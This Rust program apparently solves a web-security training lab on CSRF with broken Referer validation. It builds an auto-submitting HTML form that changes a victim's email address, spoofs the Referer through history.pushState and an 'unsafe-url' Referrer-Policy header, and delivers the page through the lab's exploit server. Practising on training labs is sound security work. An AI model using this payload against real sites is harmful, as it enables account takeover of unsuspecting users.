/***********************************************************************************
* 
* Lab: CSRF with broken Referer validation
*
* Hack Steps: 
*      1. Add the `Referrer-Policy` header to your exploit server response headers
*      2. Craft an HTML form for changing the email address with an auto-submit
*         script that changes the Referer header value using the 
*         history.pushState() method
*      3. Deliver the exploit to the victim
*      4. The victim's email will be changed after they trigger the exploit
*
************************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a9800b4041a8b74806b1c8d007b000f.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0aea006c04528b9780401b2401cc0041.exploit-server.net";

fn main() {
    let new_email = "hacked@you.com"; // You can change this to what you want
    let payload = format!(
        r###"<html>
                <body>
                <form action="{LAB_URL}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                history.pushState('', '', '/?{LAB_URL}');
                document.forms[0].submit();
                </script>
                </body>
                </html>"###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ",);
    io::stdout().flush().unwrap();

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The victim's email will be changed after they trigger the exploit");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nReferrer-Policy: unsafe-url";
    let client = build_web_client();
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
